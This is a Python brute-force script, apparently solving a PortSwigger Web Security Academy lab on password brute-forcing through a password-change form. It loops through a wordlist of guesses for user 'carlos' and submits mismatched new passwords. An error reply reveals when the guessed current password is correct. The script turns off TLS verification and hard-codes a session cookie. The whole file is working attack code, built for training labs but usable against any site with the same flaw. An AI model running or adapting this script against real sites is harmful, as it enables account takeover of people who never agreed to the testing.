# https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-brute-force-via-password-change
# Brute forcing password via password reset. Put unmatched new passwords and brute force the current password.

import urllib3
import sys
import requests

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

cookies = {'session': 'DasHk4yZPa4XOhgpVxcHVPFmjoDaU7oW'}

username = "carlos"
new_password = "admin"
other_password = "adm"

def bruteForce(url):

    finalUrl = url + "/my-account/change-password"

    print("[ + ] Brute forcing user %s..." % (username))
    
    usernameFile = open('passwords.txt', 'r')
    linesUsername = usernameFile.read().splitlines()
    for line in linesUsername:

        sys.stdout.write('\r' + "Testing password: " + line)
        print(" "*50, end='\r', flush=True)

        params = { 
                        "username": username, 
                        "current-password": line,
                        "new-password-1": new_password,
                        "new-password-2": other_password
                    }

        r = requests.post(finalUrl, verify=False, proxies=proxies, cookies=cookies, data=params)

        if "New passwords do not match" in r.text:
                print("\n\n------------------------------------")
                print('\r' + "Password found: " + line)
                print("------------------------------------")
                break

def main():
    if len(sys.argv) != 2:
        print("Usage: %s <URL>" % sys.argv[0])
        print("Example: %s https://victim.com" % sys.argv[0])

    url = sys.argv[1]
    bruteForce(url)

if __name__ == "__main__":
    main() 
